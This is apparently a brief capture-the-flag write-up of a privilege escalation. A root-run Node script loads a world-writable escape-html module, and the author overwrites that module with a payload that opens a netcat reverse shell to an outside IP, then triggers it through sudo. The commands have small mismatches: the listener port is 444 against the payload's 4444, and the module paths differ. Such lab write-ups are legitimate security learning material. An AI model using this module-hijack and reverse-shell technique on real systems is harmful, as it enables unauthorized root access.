# Privilege Escalation
sudo -l

sudo: /usr/local/bin/escaper


```
escaper is a symbolic link to a file /usr/local/lib/node_modules/app/bin/index.js
```

# Thought
By reading the content of the escaper file, I saw that it was requiring some two modules;
~~~bash
express  
escape-html
~~~

After seeing this, i used the `find` command to locate what took my interest (escape-html);
~~~bash
find / -iname "escape-html" 2>/dev/null 
~~~

After finding it, I `cd` into it listed the content of it with `ls -la`. Immediately, i saw index.js file in it with it's permissions being set as `-rw-rw-rw-`.


# Payload
I injected this payload into it
```sh
echo 'module.exports = function() { require("child_process").exec("id; whoami; nc -e /bin/bash 10.10.6.78 4444"); }' > /opt/app/node_modules/escape-html/index.js
``` 
# Execution
I set up my listening server on my host machine with;
```sh
nc -lnvp 444
```

Now, on the target, I run
```bash
sudo /usr/local/bin/escaper
``` 

**B000M** i GOT A REVERSE SHELL AS ROOT.


Have fun reading tho it's nasty.